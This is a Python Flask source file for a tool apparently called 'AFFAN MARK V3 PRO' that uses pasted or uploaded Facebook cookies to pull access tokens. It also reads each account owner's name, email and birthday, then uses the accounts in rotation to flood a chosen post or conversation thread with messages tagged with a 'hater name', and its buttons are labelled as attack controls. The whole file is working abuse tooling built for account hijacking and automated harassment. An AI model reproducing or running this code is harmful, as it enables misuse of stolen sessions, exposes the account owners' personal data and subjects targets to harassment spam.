from flask import Flask, request, render_template_string, jsonify
import threading
import time
import requests
import datetime
import re

app = Flask(__name__)

# --- Global Controls ---
log_output = []
stop_event = threading.Event()

# --- UI Design (Affan Mark Style) ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>M!!CKY DON'W - ADVANCED SERVER</title>
    <link href='https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap' rel='stylesheet'>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        setInterval(() => {
            fetch('/log').then(res => res.json()).then(data => {
                const logBox = document.getElementById('logBox');
                logBox.innerText = data.join("\\n");
                logBox.scrollTop = logBox.scrollHeight;
            });
        }, 2000);

        function stopProcess() { 
            fetch('/stop', { method: 'POST' }); 
            alert("Stopping All Tasks...");
        }
    </script>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Roboto', sans-serif; }
        .container-bg { background: #111; border: 2px solid #00ff00; box-shadow: 0 0 20px #00ff0033; }
        .affan-header { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px #00ff00; letter-spacing: 2px; }
        .form-input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 5px; width: 100%; outline: none; }
        .form-input:focus { border-color: #00ff00; }
        .btn-affan { background: #00ff00; color: #000; font-weight: bold; padding: 15px; border-radius: 5px; cursor: pointer; transition: 0.3s; width: 100%; border: none; font-size: 16px; }
        .btn-affan:hover { background: #00cc00; box-shadow: 0 0 20px #00ff0066; }
        #logBox { height: 350px; overflow-y: auto; background: #000; padding: 15px; border-radius: 5px; border: 1px solid #333; color: #00ff00; font-family: monospace; white-space: pre-wrap; font-size: 13px; }
        .tab-btn { padding: 10px 20px; background: #222; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; text-decoration: none; }
        .tab-btn.active { background: #00ff00; color: #000; }
    </style>
</head>
<body class="p-4 md:p-10">
    <div class="max-w-3xl mx-auto container-bg rounded-xl p-6 md:p-8">
        <h1 class="text-3xl text-center affan-header mb-8 text-white">AFFAN MARK V3 <span class="text-green-500">PRO</span></h1>
        
        <div class="flex justify-center mb-8 space-x-4">
            <a href="/?mode=post" class="tab-btn {% if mode=='post' %}active{% endif %}">POST SERVER</a>
            <a href="/?mode=convo" class="tab-btn {% if mode=='convo' %}active{% endif %}">CONVO SERVER</a>
        </div>

        <form method='post' enctype='multipart/form-data' class="space-y-5">
            <input type="hidden" name="mode" value="{{ mode }}">
            
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label class="block text-xs uppercase mb-2">TARGET ID:</label>
                    <input type='text' name='threadId' class='form-input' placeholder='e.g. 100045...' required>
                </div>
                <div>
                    <label class="block text-xs uppercase mb-2">HATER NAME:</label>
                    <input type='text' name='kidx' class='form-input' placeholder='e.g. Affan...' required>
                </div>
            </div>

            <div class="space-y-2">
                <label class="block text-xs uppercase text-yellow-500">Cookie/Token (Single or File):</label>
                <textarea name='singleInput' class='form-input' rows="2" placeholder="Paste Cookie or Token here..."></textarea>
                <input type='file' name='inputFile' class='form-input' accept='.txt'>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label class="block text-xs uppercase mb-2">MESSAGES (.txt):</label>
                    <input type='file' name='messagesFile' class='form-input' accept='.txt' required>
                </div>
                <div>
                    <label class="block text-xs uppercase mb-2">DELAY (SECONDS):</label>
                    <input type='number' name='time' class='form-input' value='10' min='1' required>
                </div>
            </div>

            <button type='submit' class='btn-affan'>LAUNCH SYSTEM</button>
        </form>

        <div class="mt-10">
            <h2 class="text-lg affan-header mb-4 text-white">LIVE SYSTEM LOGS</h2>
            <div id='logBox'>Waiting for action...</div>
            <button onclick="stopProcess()" class="mt-4 bg-red-600 text-white px-8 py-4 rounded-lg font-bold w-full hover:bg-red-700 transition shadow-lg">STOP ALL ATTACKS</button>
        </div>

        <div class="text-center mt-8 text-gray-600 text-xs italic">
            OWNER: MIICKY | ADVANCED TOKEN CHECKER + AUTO SERVER
        </div>
    </div>
</body>
</html>
"""

def get_token_details(token):
    """Token Detailed Checker: Gets name, email, and dob"""
    try:
        params = {'access_token': token, 'fields': 'id,name,email,birthday'}
        res = requests.get("https://graph.facebook.com/me", params=params, timeout=10).json()
        if 'id' in res:
            return {
                "name": res.get("name", "Unknown"),
                "email": res.get("email", "N/A"),
                "dob": res.get("birthday", "N/A")
            }
        return None
    except:
        return None

def extract_token(cookie):
    """Extracts EAAA token from cookie"""
    headers = {
        'authority': 'business.facebook.com',
        'cookie': cookie.strip(),
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        res = requests.get('https://business.facebook.com/business_locations', headers=headers, timeout=10).text
        token = re.search('(EAAA\w+)', res)
        return token.group(1) if token else None
    except:
        return None

def run_attack(mode, thread_id, hater_name, delay, messages, raw_inputs):
    log_output.append(f"[*] MIICKY V3 INITIALIZED...")
    
    active_accounts = []
    
    for i, item in enumerate(raw_inputs):
        if not item.strip(): continue
        
        # Determine if input is a cookie or a token
        token = item if item.startswith("EAAA") else extract_token(item)
        
        if token:
            details = get_token_details(token)
            if details:
                active_accounts.append({"token": token, "name": details['name']})
                log_output.append(f"[CHECKER] Account {i+1}: {details['name']} (VALID)")
                log_output.append(f" ╰─ Email: {details['email']} | DOB: {details['dob']}")
            else:
                log_output.append(f"[CHECKER] Input {i+1}: Token Invalid/Expired")
        else:
            log_output.append(f"[CHECKER] Input {i+1}: Extraction Failed")

    if not active_accounts:
        log_output.append("[!] FATAL: No working accounts found. Task stopped.")
        return

    log_output.append(f"[+] Total Active Targets: {len(active_accounts)}")
    
    msg_idx = 0
    acc_idx = 0

    while not stop_event.is_set():
        try:
            current_acc = active_accounts[acc_idx % len(active_accounts)]
            message = f"{hater_name} {messages[msg_idx % len(messages)].strip()}"
            
            url = f"https://graph.facebook.com/{thread_id}/comments" if mode == 'post' else f"https://graph.facebook.com/v15.0/t_{thread_id}/"
            
            payload = {'message': message, 'access_token': current_acc['token']}
            response = requests.post(url, data=payload, timeout=10)

            if response.status_code == 200:
                log_output.append(f"[SUCCESS] {current_acc['name']} -> {message[:15]}...")
            else:
                log_output.append(f"[ERROR] {current_acc['name']} Status: {response.status_code}")
            
            msg_idx += 1
            acc_idx += 1
            time.sleep(delay)

        except Exception as e:
            log_output.append(f"[!] Error: {str(e)}")
            time.sleep(5)

@app.route('/', methods=['GET', 'POST'])
def index():
    mode = request.args.get('mode', 'post')
    if request.method == 'POST':
        mode = request.form.get('mode')
        thread_id = request.form['threadId']
        hater_name = request.form['kidx']
        delay = int(request.form['time'])
        
        all_inputs = []
        single = request.form.get('singleInput')
        if single.strip(): all_inputs.append(single.strip())
        
        file = request.files.get('inputFile')
        if file and file.filename != '':
            all_inputs.extend(file.read().decode('utf-8').splitlines())
            
        messages = request.files['messagesFile'].read().decode('utf-8').splitlines()

        stop_event.clear()
        threading.Thread(target=run_attack, args=(mode, thread_id, hater_name, delay, messages, all_inputs)).start()
        
    return render_template_string(HTML_PAGE, mode=mode)

@app.route('/log')
def log():
    return jsonify(log_output[-20:])

@app.route('/stop', methods=['POST'])
def stop():
    stop_event.set()
    log_output.append("[!] EMERGENCY STOP: Attack Terminated.")
    return ('', 204)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000)
